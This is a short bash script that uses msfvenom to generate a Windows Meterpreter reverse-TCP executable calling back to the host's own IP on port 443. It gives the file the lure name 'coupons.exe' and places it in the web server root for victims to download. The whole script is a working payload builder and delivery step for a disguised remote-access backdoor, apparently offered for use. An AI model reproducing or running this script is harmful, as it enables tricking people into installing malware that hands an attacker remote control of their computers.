#!/bin/bash
hostip=$(sudo hostname -I)
msfvenom -p windows/meterpreter/reverse_tcp –platform windows -f exe LHOST=$hostip LPORT=443 -o /home/centos/coupons.exe
sudo mv /home/centos/coupons.exe /var/www/html/
echo -e "\n\nmalicious payload created !!"
